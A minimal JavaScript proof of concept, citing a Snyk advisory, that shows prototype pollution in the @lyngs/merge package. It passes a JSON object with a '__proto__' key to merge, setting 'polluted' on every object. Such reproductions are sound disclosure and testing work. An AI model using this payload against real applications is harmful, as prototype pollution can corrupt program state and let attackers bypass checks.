//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
 
  const { merge } = require("@lyngs/merge");
   
  merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
// End of file
